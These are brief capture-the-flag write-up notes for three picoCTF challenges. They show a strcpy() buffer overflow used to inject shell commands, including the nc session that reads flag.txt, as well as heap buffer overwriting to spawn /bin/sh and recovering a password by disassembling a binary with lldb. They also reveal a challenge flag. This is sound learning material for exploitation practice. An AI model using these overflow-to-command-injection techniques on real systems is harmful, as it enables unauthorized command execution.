
# Input Injection

using a buffer overflow due to the use of `strcpy()` in the code, we can overwrite the buffer containing the command and have it write whatever command we want. From there we can do it like I did it, or we can just start a shell

``` 
$amiable-citadel.picoctf.net 49801
What is your name?
AAAAAAAAAAls
Goodbye, AAAAAAAAAAls!
flag.txt

$nc amiable-citadel.picoctf.net 49801
What is your name?
AAAAAAAAAAcat flag.txt
Goodbye, AAAAAAAAAAcat flag.txt!
picoCTF{0v3rfl0w_c0mm4nd_3185bc8f}
```

# Input Injection 2

Same idea except now buffer of each command is 28 and they are being allocated in the heap. We used `/bin/sh` as the command to set a shell since I am pretty sure `scanf()` doesn't allow for spaces

# Bypass Me
SSH into the host, using lldb I ran a disassembly,

the disassembly of main shows the calling of a function decode_password
![[Bypassme1.PNG]]
disassembling that gives us the password decoding
![[bypassme2.PNG]]
From there we find the password to be "SuperSecure"
![[bypassme3.PNG]]
Input and got the flag
